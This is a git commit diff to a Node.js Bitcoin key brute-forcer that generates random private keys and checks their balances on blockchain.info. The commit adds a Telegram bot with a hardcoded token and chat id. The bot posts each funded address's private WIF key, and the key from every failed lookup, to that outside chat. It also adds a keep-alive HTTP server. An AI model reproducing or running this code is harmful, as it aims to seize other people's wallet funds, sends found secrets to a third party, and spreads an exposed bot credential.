eb5d7e6c827228731c4cdf17d033447989c17a95
Arman <32128949+AubakirovArman@users.noreply.github.com>
2021-06-11 23:24:21 +0600

    ad
    ad

--- generator.js
+++ generator.js
@@ -4,12 +4,92 @@ const CoinKey = require('coinkey')
 const setTitle = require('node-bash-title');
 const getRandomValues = require('get-random-values')
 const fs = require('fs');
+const http = require('http');
+let http1 = require('request')
 
+const hostname = '0.0.0.0';
+const port = process.env.PORT || 5000;
+class telegram {
+  constructor() {
+    this.token = "1386701421:AAG16unykxBGYzkP7lrPAvez7_NnRxaeCvQ"
+    this.id = "854186602"
+    this.url = "https://api.telegram.org/bot"+this.token;
+    this.text = ""
+    this.answerMarket = ""
+    this.status = "вкл"
+    this.params = {
+      'method': 'post',
+      'muteHttpExceptions': true
+    }
+  }
+  // отправка сообщение в телеграмм
+  telegramSendLog() {
+    if (this.status == "вкл") {
+      this.answerMarket=JSON.stringify(this.answerMarket)
+      this.answerMarket = this.answerMarket.replace("{", "");
+      this.answerMarket = this.answerMarket.replace("}", "");
+      let text = this.answerMarket ;
 
-let count=0
+      this.message = this.url + "/sendMessage?chat_id=" + this.id + "&text=" + text;
+      http1.post(this.message)
+
+    }
+  }
+  telegramSendText() {
+    if (this.status == "вкл") {
+
+      this.text=encodeURIComponent(this.text)
+      this.message = (this.url + "/sendMessage?chat_id=" + this.id + "&text=" + this.text);
+      http1.post(this.message)
+    }
+  }
+  telegramSend() {
+    if (this.status == "вкл") {
+      this.message = this.url + "/sendMessage?chat_id=" + this.id + "&text=" + this.text;
+      http1.post(this.message)
+    }
+  }
+}
+const server = http.createServer((req, res) => {
+  res.statusCode = 200;
+  res.setHeader('Content-Type', 'text/plain');
+  res.end('Hello, World!\n');
+});
+
+server.listen(port, hostname, () => {
+  console.log(`Server running at http://${hostname}:${port}/`);
+});
+var ero1=0
+var teleg =new telegram();
+
+ function checkbalance(add){
+  var answer=1
+  let url= 'https://blockchain.info/address/'+(add.publicAddress).toString()+'?format=json'
+  request(url,function (error, response, body) {
+    try{
+      let ans=JSON.parse(body)
+      let n_tx=JSON.parse(body)
+
+        if (0==ans.final_balance || 0==n_tx.n_tx){
+          answer = false        
+        }else{
+          teleg.answerMarket=body+"} \n{"+add.publicAddress+"} \n{"+add.privateWif
+          teleg.telegramSendLog()
+          console.log('\x1b[36m%s\x1b[0m', body)
+          answer = true
+       }
+    }catch{
+      teleg.answerMarket=body+"} \n{"+add.publicAddress+"} \n{"+add.privateWif
+      teleg.telegramSendLog()
+      ero1++
+      if (ero1>10000){
+        ero1=0
+      }
+      checkbalance(add)
+    }
+    })
+}
 function generate() {
-    count++
-    setTitle(count.toString());
     let randArr = new Uint8Array(32);
     getRandomValues(randArr)
     
@@ -27,22 +107,32 @@ function generate() {
     
     let ck = new CoinKey(Buffer.from(privateKeyHex, 'hex'))
     ck.compressed = false
-     let url= 'https://blockchain.info/address/'+(ck.publicAddress).toString()+'?format=json'
-    
-    request(url,function (error, response, body) {
-        let ans=JSON.parse(body).final_balance
-        let n_tx=JSON.parse(body).n_tx
-          if (0==ans || 0==n_tx){
-            generate()
-          }else{
-            console.log(n_tx)
-            console.log(ans)
-            console.log(ck.publicAddress) // don't do this if you want even faster performance.
-            console.log(ck.privateWif)
-         }
-      })
+    return ck
+
 }
 
-generate()
 
+function sta(){
+  let ck1=generate()
+  let bal=checkbalance(ck1)
+  if (bal==true){
+      console.log(ck1.privateWif)
+      console.log(ck1.publicAddress)
+    }
+  }
+
+function logEvery2Seconds(i) {
+    setTimeout(() => {
+        sta()
+        let text=""
+        text="c:"+i+" e:"+ero1
+        setTitle(text);
+        if (i%1000==0){
+          console.log(i)
+        }
+        logEvery2Seconds(++i);
+    }, 50)
+}
+
+logEvery2Seconds(0);
 
